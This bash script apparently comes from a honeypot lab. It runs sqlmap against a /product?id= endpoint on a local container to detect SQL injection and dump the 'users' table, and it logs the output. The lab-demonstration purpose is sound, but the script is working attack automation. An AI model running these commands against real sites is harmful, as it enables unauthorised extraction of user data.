#!/usr/bin/env bash
# =============================================================================
# Computer 3 — 06_sqlmap.sh
# sqlmap against /product?id= on the HTTP container to demonstrate automated
# SQL injection exploitation (dump users table).
# =============================================================================
set -uo pipefail
cd "$(dirname "$0")/.."
[ -f .env ] && set -a && . ./.env && set +a
HOST="${HONEYPOT_HOST:-192.168.1.10}"
OUT="results/06_sqlmap"
mkdir -p results

URL="http://${HOST}:${HTTP_PORT:-8080}/product?id=1"

echo "[+] sqlmap detection on ${URL}..."
if command -v sqlmap >/dev/null 2>&1; then
  sqlmap -u "$URL" --batch --level=3 --risk=2 --dbs --output-dir="${OUT}" 2>&1 | tee "${OUT}_detect.log" || true
  echo ""
  echo "[+] sqlmap dumping users table..."
  sqlmap -u "$URL" --batch -D main -T users --dump --output-dir="${OUT}" 2>&1 | tee "${OUT}_dump.log" || true
else
  echo "    (sqlmap not installed — run: sudo apt install sqlmap)"
fi

echo "[+] Done. Results in results/${OUT}/"
